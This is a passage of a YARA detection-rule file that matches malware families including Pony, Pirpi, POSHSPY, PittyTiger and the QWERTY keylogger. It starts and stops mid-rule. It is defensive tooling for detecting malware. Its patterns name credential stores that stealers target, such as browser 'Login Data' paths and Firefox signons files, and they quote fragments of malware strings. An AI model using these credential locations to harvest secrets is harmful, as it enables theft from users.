\"\\\\Tencent\\\\QQBrowser\\\\User Data\\\\Default\\\\EncryptedStorage\" wide ascii\n        $d8 = \"\\\\Liebao7\\\\User Data\\\\Default\\\\EncryptedStorage\" wide ascii\n        $d9 = \"\\\\Foxmail.url.mailto\\\\Shell\\\\open\\\\command\" wide ascii\n        $d10 = \"\\\\Torch\\\\User Data\\\\Default\\\\Login Data\" wide ascii\n        $d11 = \"\\\\Slimjet\\\\User Data\\\\Default\\\\Login Data\" wide ascii\n        $d12 = \"\\\\Orbitum\\\\User Data\\\\Default\\\\Login Data\" wide ascii\n        $d13 = \"\\\\AVAST Software\\\\Browser\\\\User Data\\\\Default\\\\Login Data\" wide ascii\n\n        $c1 = \"smtp\" fullword\n        $c2 = \"ftp\" fullword\n        $c3 = \"telegram\" fullword\n        $c4 = \"Phoenix Keylogger\" fullword\n        $c5 = \"Debug1.txt\"\n        $c6 = \"Micrusoft\"\n        \n    condition:\n         //Memory dump, function string file\n        (\n            vmray_target_class == \"function_strings\"\n            or vmray_target_class == \"memory_dump\"\n        )\n        and 4 of ($s*)\n        and 9 of ($d*)\n        and 1 of ($c*)\n}\n\nrule Pipcreat\n{\n    meta:\n        description = \"Pipcreat backdoor\"\n        ref = \"http://www.cyberengineeringservices.com/login-exe-analysis-trojan-pipcreat/\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Pipcreat\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"chort (@chort0)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Win_Pipcreat\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $strA = \"pip creat failed\" wide fullword\n        $strB = \"CraatePipe\" ascii fullword\n        $strC = \"are you there? \" wide fullword\n        $strD = \"success kill process ok\" wide fullword\n        $strE = \"Vista|08|Win7\" wide fullword\n        $rut = \"are you there!@#$%^&*()_+\" ascii fullword\n\n    condition:\n        $rut or (2 of ($str*))\n}\n\nrule Pirpi_1609_A\n{\n    meta:\n        description = \"Pirpi backdoor\"\n        ref = \"http://goo.gl/igxLyF\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Pirpi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Pirpi_1609_A\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"expand.exe1.gif\" fullword ascii\n        $c1 = \"expand.exe\" fullword ascii\n        $c2 = \"ctf.exe\" fullword ascii\n        $s1 = \"flvUpdate.exe\" fullword wide\n        $s2 = \"www.ThinkWorking.com\" fullword wide\n        $s3 = \"ctfnon.exe\" fullword ascii\n        $s4 = \"flv%d.exe\" fullword ascii\n        $s5 = \"HARDWARE\\\\DESCRIPTION\\\\System\\\\BIOS\" fullword ascii\n        $s6 = \"12811[%d].gif\" fullword ascii\n        $s7 = \"GetApp03\" fullword wide\n        $s8 = \"flvUpdate\" fullword wide\n        $s9 = \"%d-%4.4d%d\" fullword ascii\n        $s10 = \"http://%s/%5.5d.html\" fullword ascii\n        $s11 = \"flvbho.exe\" fullword wide\n        $op1 = { 74 08 c1 cb 0d 03 da 40 eb }\n        $op2 = { 03 f5 56 8b 76 20 03 f5 33 c9 49 }\n        $op3 = { 03 dd 66 8b 0c 4b 8b 5e 1c 03 dd 8b 04 8b 03 c5 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and ($x1 or all of ($c*) or all of ($op*))) or (8 of them)\n}\n\nrule Pirpi_1609_B\n{\n    meta:\n        description = \"Pirpi backdoor\"\n        ref = \"http://goo.gl/igxLyF\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Pirpi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Pirpi_1609_B\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"tconn <ip> <port> //set temp connect value, and disconnect.\" fullword ascii\n        $s2 = \"E* ListenCheckSsl SslRecv fd(%d) Error ret:%d %d\" fullword ascii\n        $s3 = \"%s %s L* ListenCheckSsl fd(%d) SslV(-%d-)\" fullword ascii\n        $s4 = \"S:%d.%d-%d.%d V(%d.%d) Listen On %d Ok.\" fullword ascii\n        $s5 = \"E* ListenCheckSsl fd(%d) SslAccept Err %d\" fullword ascii\n        $s6 = \"%s-%s N110 Ssl Connect Ok(%s:%d).\" fullword ascii\n        $s7 = \"%s-%s N110 Basic Connect Ok(%s:%d).\" fullword ascii\n        $s8 = \"tconn <ip> <port>\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them) or (4 of them)\n}\n\nrule PittyTiger\n{\n    meta:\n        description = \"PittyTiger trojan\"\n        classifications = \"Trojan\"\n        threat_names = \"PittyTiger\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \" (@chort0)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"PittyTiger\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $ptUserAgent = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.; SV1)\"\n        $ptFC001 = \"FC001\" fullword\n        $ptPittyTiger = \"PittyTiger\" fullword\n        $trjHTMLerr = \"trj:HTML Err.\" nocase fullword\n        $trjworkFunc = \"trj:workFunc start.\" nocase fullword\n        $trjcmdtout = \"trj:cmd time out.\" nocase fullword\n        $trjThrtout = \"trj:Thread time out.\" nocase fullword\n        $trjCrPTdone = \"trj:Create PT done.\" nocase fullword\n        $trjCrPTerr = \"trj:Create PT error: mutex already exists.\" nocase fullword\n        $oddPippeFailed = \"Create Pippe Failed!\" fullword\n        $oddXferingFile = \"Transfering File\" fullword\n        $oddParasError = \"put Paras Error:\" fullword\n        $oddCmdTOutkilled = \"Cmd Time Out..Cmd has been killed.\" fullword\n\n    condition:\n        (any of ($pt*)) and (any of ($trj*)) and (any of ($odd*))\n}\n\nrule Ponmocup_\n{\n    meta:\n        description = \"Ponmocup bot installer\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        classifications = \"Bot\"\n        threat_names = \"Ponmocup\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Trj_Ponmocup\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $pac = { 48 8F BB 54 5F 3E 4F 4E }\n        $unp = { 8B B8 7C 1F 46 00 33 C8 }\n\n    condition:\n        uint16(0) == 0x5a4d and ($pac at 0x61F7C) and ($unp at 0x29F0)\n}\n\nrule Ponmocup_Downloader\n{\n    meta:\n        description = \"Ponmocup bot downloader\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        classifications = \"Bot, Downloader\"\n        threat_names = \"Ponmocup\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Trj_Ponmocup_Downloader\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $vb5 = \"VB5\" fullword ascii\n        $tpb = \"www.thepiratebay.org\" fullword wide\n        $ua = \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; SV1)\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and ($vb5) and ($tpb) and ($ua)\n}\n\nrule Ponmocup_dll\n{\n    meta:\n        description = \"Ponmocup bot DLL\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        classifications = \"Bot\"\n        threat_names = \"Ponmocup\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Trj_Ponmocup_dll\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $pck = { 00 81 23 00 33 3E 00 00 3B F4 56 00 00 00 7D 00 }\n        $upk = { 68 F4 14 00 10 A1 6C C0 02 10 FF D0 59 59 E9 7A }\n\n    condition:\n        uint16(0) == 0x5a4d and ($pck at 0x8a50) and ($upk at 0x61f)\n}\n\nrule pony\n{\n    meta:\n        description = \"Pony spyware\"\n        classifications = \"Spyware\"\n        threat_names = \"Pony\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"pony\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $s1 = \"{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\"\n        $s2 = \"YUIPWDFILE0YUIPKDFILE0YUICRYPTED0YUI1.0\"\n        $s3 = \"POST %s HTTP/1.0\"\n        $s4 = \"Accept-Encoding: identity, *;q=0\"\n\n    condition:\n        $s1 and $s2 and $s3 and $s4\n}\n\nrule pony_stealer\n{\n    meta:\n        description = \"Pony spyware\"\n        ref = \"https://www.knowbe4.com/pony-stealer\"\n        classifications = \"Spyware\"\n        threat_names = \"Pony\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@mimeframe\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"malware_windows_pony_stealer\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $a1 = \"signons.sqlite\" nocase wide ascii\n        $a2 = \"signons.txt\" nocase wide ascii\n        $a3 = \"signons2.txt\" nocase wide ascii\n        $a4 = \"signons3.txt\" nocase wide ascii\n        $a5 = \"WininetCacheCredentials\" nocase wide ascii\n        $a6 = \"moz_logins\" nocase wide ascii\n        $a7 = \"encryptedPassword\" nocase wide ascii\n        $a8 = \"FlashFXP\" nocase wide ascii\n        $a9 = \"BulletProof\" nocase wide ascii\n        $a10 = \"CuteFTP\" nocase wide ascii\n\n    condition:\n        all of ($a*)\n}\n\nrule POSHSPY_Malware\n{\n    meta:\n        description = \"POSHSPY backdoor\"\n        ref = \"https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"POSHSPY\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"POSHSPY_Malware\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"function sWP($cN, $pN, $aK, $aI)\" fullword ascii\n        $x2 = \"$aeK = [byte[]] (0x69, 0x87, 0x0b, 0xf2\" ascii\n        $x3 = \"(('variant', 'excretions', 'accumulators', 'winslow', 'whistleable', 'len',\"\n        $x4 = \"$cPairKey = \\\"BwIAAACkAABSU0EyAAQAAAEAA\"\n        $x5 = \"$exeRes = exePldRoutine\"\n        $x6 = \"ZgB1AG4AYwB0AGkAbwBuACAAcAB1AHIAZgBDAHIA\"\n\n    condition:\n        1 of them\n}\n\nrule ProjectHook\n{\n    meta:\n        description = \"ProjectHook POS malware\"\n        classifications = \"Spyware\"\n        threat_names = \"ProjectHook\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"ProjectHook\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $projecthook = \"ProjectHook\"\n        $delphi = \"FastMM Borland Edition (c) 2004 - 2008 Pierre le Riche / Professional Software Development\"\n\n    condition:\n        all of them\n}\n\nrule project_hook\n{\n    meta:\n        description = \"ProjectHook POS malware\"\n        classifications = \"Spyware\"\n        threat_names = \"ProjectHook\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@patrickrolsen\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"pos_malware_project_hook\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"CallImage.exe\"\n        $s2 = \"BurpSwim\"\n        $s3 = \"Work\\\\Project\\\\Load\"\n        $s4 = \"WortHisnal\"\n\n    condition:\n        uint16(0) == 0x5A4D and all of ($s*)\n}\n\nrule FiveEyes_QUERTY_Malwareqwerty_20121\n{\n    meta:\n        description = \"QUERTY keylogger (file: 20121.xml)\"\n        ref = \"http://www.spiegel.de/media/media-35668.pdf\"\n        classifications = \"Spyware\"\n        threat_names = \"QWERTY, WARRIORPRIDE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"FiveEyes_QUERTY_Malwareqwerty_20121\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"<configFileName>20121_cmdDef.xml</configFileName>\" fullword ascii\n        $s1 = \"<name>20121.dll</name>\" fullword ascii\n        $s2 = \"<codebase>\\\"Reserved for future use.\\\"</codebase>\" fullword ascii\n        $s3 = \"<plugin xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:noNamespaceS\" ascii\n        $s4 = \"<platform type=\\\"1\\\">\" fullword ascii\n        $s5 = \"</plugin>\" fullword ascii\n        $s6 = \"</pluginConfig>\" fullword ascii\n        $s7 = \"<pluginConfig>\" fullword ascii\n        $s8 = \"</platform>\" fullword ascii\n        $s9 = \"</lpConfig>\" fullword ascii\n        $s10 = \"<lpConfig>\" fullword ascii\n\n    condition:\n        9 of them\n}\n\nrule FiveEyes_QUERTY_Malwaresig_20123_sys\n{\n    meta:\n        description = \"QUERTY keylogger (file: 20123.sys.bin)\"\n        ref = \"http://www.spiegel.de/media/media-35668.pdf\"\n        classifications = \"Spyware\"\n        threat_names = \"QWERTY, WARRIORPRIDE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"FiveEyes_QUERTY_Malwaresig_20123_sys\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"20123.dll\" fullword ascii\n        $s1 = \"kbdclass.sys\" fullword wide\n        $s2 = \"IoFreeMdl\" fullword ascii\n        $s3 = \"ntoskrnl.exe\" fullword ascii\n        $s4 = \"KfReleaseSpinLock\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule FiveEyes_QUERTY_Malwaresig_20123_cmdDef\n{\n    meta:\n        description = \"QUERTY keylogger (file: 20123_cmdDef.xml)\"\n        ref = \"http://www.spiegel.de/media/media-35668.pdf\"\n        classifications = \"Spyware\"\n        threat_names = \"QWERTY, WARRIORPRIDE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"FiveEyes_QUERTY_Malwaresig_20123_cmdDef\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"<shortDescription>Keystroke Collector</shortDescription>\" fullword ascii\n        $s1 = \"This plugin is the E_Qwerty Kernel Mode driver for logging keys.</description>\" fullword ascii\n        $s2 = \"<commands/>\" fullword ascii\n        $s3 = \"</version>\" fullword ascii\n        $s4 = \"<associatedImplantId>20121</associatedImplantId>\" fullword ascii\n        $s5 = \"<rightsRequired>System or Administrator (if Administrator, I think the DriverIns\" ascii\n        $s6 = \"<platforms>Windows NT, Windows 2000, Windows XP (32/64 bit), Windows 2003 (32/64\" ascii\n        $s7 = \"<projectpath>plugin/Collection</projectpath>\" fullword ascii\n        $s8 = \"<dllDepend>None</dllDepend>\" fullword ascii\n        $s9 = \"<minorType>0</minorType>\" fullword ascii\n        $s10 = \"<pluginname>E_QwertyKM</pluginname>\" fullword ascii\n        $s11 = \"</comments>\" fullword ascii\n        $s12 = \"<comments>\" fullword ascii\n        $s13 = \"<majorType>1</majorType>\" fullword ascii\n        $s14 = \"<files>None</files>\" fullword ascii\n        $s15 = \"<poc>Erebus</poc>\" fullword ascii\n        $s16 = \"</plugin>\" fullword ascii\n        $s17 = \"<team>None</team>\" fullword ascii\n        $s18 = \"<?xml-stylesheet type=\\\"text/xsl\\\" href=\\\"../XSLT/pluginHTML.xsl\\\"?>\" fullword ascii\n        $s19 = \"<pluginsDepend>U_HookManager v1.0, Kernel Covert Store v1.0</pluginsDepend>\" fullword ascii\n        $s20 = \"<plugin id=\\\"20123\\\" xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi\" ascii\n\n    condition:\n        14 of them\n}\n\nrule FiveEyes_QUERTY_Malwaresig_20121_dll\n{\n    meta:\n        description = \"QUERTY keylogger (file: 20121.dll.bin)\"\n        ref = \"http://www.spiegel.de/media/media-35668.pdf\"\n        classifications = \"Spyware\"\n        threat_names = \"QWERTY, WARRIORPRIDE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"FiveEyes_QUERTY_Malwaresig_20121_dll\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"WarriorPride\\\\production2.0\\\\package\\\\E_Wzowski\" ascii\n        $s1 = \"20121.dll\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule FiveEyes_QUERTY_Malwareqwerty_20123\n{\n    meta:\n        description = \"QUERTY keylogger (file: 20123.xml)\"\n        ref = \"http://www.spiegel.de/media/media-35668.pdf\"\n        classifications = \"Spyware\"\n        threat_names = \"QWERTY, WARRIORPRIDE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"FiveEyes_QUERTY_Malwareqwerty_20123\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"<!-- edited with XMLSPY v5 rel. 4 U (http://www.xmlspy.com) by TEAM (RENEGADE) -\" ascii\n        $s1 = \"<configFileName>20123_cmdDef.xml</configFileName>\" fullword ascii\n        $s2 = \"<name>20123.sys</name>\" fullword ascii\n        $s3 = \"<plugin xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:noNamespaceS\" ascii\n        $s4 = \"<codebase>/bin/i686-pc-win32/debug</codebase>\" fullword ascii\n        $s5 = \"<platform type=\\\"1\\\">\" fullword ascii\n        $s6 = \"</plugin>\" fullword ascii\n        $s7 = \"</pluginConfig>\" fullword ascii\n        $s8 = \"<pluginConfig>\" fullword ascii\n        $s9 = \"</platform>\" fullword ascii\n        $s10 = \"</lpConfig>\" fullword ascii\n        $s11 = \"<lpConfig>\" fullword ascii\n\n    condition:\n        9 of them\n}\n\nrule FiveEyes_QUERTY_Malwaresig_20120_dll\n{\n    meta:\n        description = \"QUERTY keylogger (file: 20120.dll.bin)\"\n        ref = \"http://www.spiegel.de/media/media-35668.pdf\"\n        classifications = \"Spyware\"\n        threat_names = \"QWERTY, WARRIORPRIDE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"FiveEyes_QUERTY_Malwaresig_20120_dll\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"\\\\QwLog_%d-%02d-%02d-%02d%02d%02d.txt\" fullword wide\n        $s1 = \"\\\\QwLog_%d-%02d-%02d-%02d%02d%02d.xml\" fullword wide\n        $s2 = \"Failed to send the EQwerty_driverStatusCommand to the implant.\" fullword ascii\n        $s3 = \"- Log Used (number of windows) - %d\" fullword wide\n        $s4 = \"- Log Limit (number of windows) - %d\" fullword wide\n        $s5 = \"Process or User Default Language\" fullword wide\n        $s6 = \"Windows 98/Me, Windows NT 4.0 and later: Vietnamese\" fullword wide\n        $s7 = \"- Logging of keystrokes is switched ON\" fullword wide\n        $s8 = \"- Logging of keystrokes is switched OFF\" fullword wide\n        $s9 = \"Qwerty is currently logging active windows with titles containing the fo\" wide\n        $s10 = \"Windows 95, Windows NT 4.0 only: Korean (Johab)\" fullword wide\n        $s11 = \"FAILED to get Qwerty Status\" fullword wide\n        $s12 = \"- Successfully retrieved Log from Implant.\" fullword wide\n        $s13 = \"- Logging of all Windows is toggled ON\" fullword wide\n        $s14 = \"- Logging of all Windows is toggled OFF\" fullword wide\n        $s15 = \"Qwerty FAILED to retrieve window list.\" fullword wide\n        $s16 = \"- UNSUCCESSFUL Log Retrieval from Implant.\" fullword wide\n        $s17 = \"The implant failed to return a valid status\" fullword ascii\n        $s18 = \"- Log files were NOT generated!\" fullword wide\n        $s19 = \"Windows 2000/XP: Armenian. This is Unicode only.\" fullword wide\n        $s20 = \"- This machine is using a PS/2 Keyboard - Continue on using QWERTY\" fullword wide\n\n    condition:\n        10 of them\n}\n\nrule FiveEyes_QUERTY_Malwaresig_20120_cmdDef\n{\n    meta:\n        description = \"QUERTY keylogger (file: 20120_cmdDef.xml)\"\n        ref = \"http://www.spiegel.de/media/media-35668.pdf\"\n        classifications = \"Spyware\"\n        threat_names = \"QWERTY, WARRIORPRIDE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"FiveEyes_QUERTY_Malwaresig_20120_cmdDef\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"This PPC gets the current keystroke log.\" fullword ascii\n        $s1 = \"This command will add the given WindowTitle to the list of Windows to log keys f\" ascii\n        $s2 = \"This command will remove the WindowTitle corresponding to the given window title\" ascii\n        $s3 = \"This command will return the current status of the Keyboard Logger (Whether it i\" ascii\n        $s4 = \"This command Toggles logging of all Keys. If allkeys is toggled all keystrokes w\" ascii\n        $s5 = \"<definition>Turn logging of all keys on|off</definition>\" fullword ascii\n        $s6 = \"<name>Get Keystroke Log</name>\" fullword ascii\n        $s7 = \"<description>Keystroke Logger Lp Plugin</description>\" fullword ascii\n        $s8 = \"<definition>display help for this function</definition>\" fullword ascii\n        $s9 = \"This command will switch ON Logging of keys. All keys taht are entered to a acti\" ascii\n        $s10 = \"Set the log limit (in number of windows)\" fullword ascii\n        $s11 = \"<example>qwgetlog</example>\" fullword ascii\n        $s12 = \"<aliasName>qwgetlog</aliasName>\" fullword ascii\n        $s13 = \"<definition>The title of the Window whose keys you wish to Log once it becomes a\" ascii\n        $s14 = \"This command will switch OFF Logging of keys. No keystrokes will be captured\" fullword ascii\n        $s15 = \"<definition>The title of the Window whose keys you no longer whish to log</defin\" ascii\n        $s16 = \"<command id=\\\"32\\\">\" fullword ascii\n        $s17 = \"<command id=\\\"3\\\">\" fullword ascii\n        $s18 = \"<command id=\\\"7\\\">\" fullword ascii\n        $s19 = \"<command id=\\\"1\\\">\" fullword ascii\n        $s20 = \"<command id=\\\"4\\\">\" fullword ascii\n\n    condition:\n        10 of them\n}\n\nrule FiveEyes_QUERTY_Malwareqwerty_20120\n{\n    meta:\n        description = \"QUERTY keylogger (file: 20120.xml)\"\n        ref = \"http://www.spiegel.de/media/media-35668.pdf\"\n        classifications = \"Spyware\"\n        threat_names = \"QWERTY, WARRIORPRIDE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"FiveEyes_QUERTY_Malwareqwerty_20120\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"<configFileName>20120_cmdDef.xml</configFileName>\" fullword ascii\n        $s1 = \"<name>20120.dll</name>\" fullword ascii\n        $s2 = \"<codebase>\\\"Reserved for future use.\\\"</codebase>\" fullword ascii\n        $s3 = \"<plugin xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:noNamespaceS\" ascii\n        $s4 = \"<platform type=\\\"1\\\">\" fullword ascii\n        $s5 = \"</plugin>\" fullword ascii\n        $s6 = \"</pluginConfig>\" fullword ascii\n        $s7 = \"<pluginConfig>\" fullword ascii\n        $s8 = \"</platform>\" fullword ascii\n        $s9 = \"</lpConfig>\" fullword ascii\n        $s10 = \"<lpConfig>\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule FiveEyes_QUERTY_Malwaresig_20121_cmdDef\n{\n    meta:\n        description = \"QUERTY keylogger (file: 20121_cmdDef.xml)\"\n        ref = \"http://www.spiegel.de/media/media-35668.pdf\"\n        classifications = \"Spyware\"\n        threat_names = \"QWERTY, WARRIORPRIDE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"FiveEyes_QUERTY_Malwaresig_20121_cmdDef\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"<shortDescription>Keystroke Logger Plugin.</shortDescription>\" fullword ascii\n        $s1 = \"<message>Failed to get File Time</message>\" fullword ascii\n        $s2 = \"<description>Keystroke Logger Plugin.</description>\" fullword ascii\n        $s3 = \"<message>Failed to set File Time</message>\" fullword ascii\n        $s4 = \"</commands>\" fullword ascii\n        $s5 = \"<commands>\" fullword ascii\n        $s6 = \"</version>\" fullword ascii\n        $s7 = \"<associatedImplantId>20120</associatedImplantId>\" fullword ascii\n        $s8 = \"<message>No Comms. with Driver</message>\" fullword ascii\n        $s9 = \"</error>\" fullword ascii\n        $s10 = \"<message>Invalid File Size</message>\" fullword ascii\n        $s11 = \"<platforms>Windows (User/Win32)</platforms>\" fullword ascii\n        $s12 = \"<message>File Size Mismatch</message>\" fullword ascii\n        $s13 = \"<projectpath>plugin/Utility</projectpath>\" fullword ascii\n        $s14 = \"<pluginsDepend>None</pluginsDepend>\" fullword ascii\n        $s15 = \"<dllDepend>None</dllDepend>\" fullword ascii\n        $s16 = \"<pluginname>E_QwertyIM</pluginname>\" fullword ascii\n        $s17 = \"<rightsRequired>None</rightsRequired>\" fullword ascii\n        $s18 = \"<minorType>0</minorType>\" fullword ascii\n        $s19 = \"<code>00001002</code>\" fullword ascii\n        $s20 = \"<code>00001001</code>\" fullword ascii\n\n    condition:\n        12 of them\n}\n\nrule linux_rakos\n{\n    meta:\n        description = \"Rakos bot\"\n        ref = \"http://www.welivesecurity.com/2016/12/20/new-linuxrakos-threat-devices-servers-ssh-scan/\"\n        classifications = \"Worm, Bot\"\n        threat_names = \"Rakos\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Peter K\u00e1lnai\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"linux_rakos\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    strings:\n        $ = \"upgrade/vars.yaml\"\n        $ = \"MUTTER\"\n        $ = \"/tmp/.javaxxx\"\n        $ = \"uckmydi\"\n\n    condition:\n        3 of them\n}\n\nrule Reaver3_Malware_Nov17_1\n{\n    meta:\n        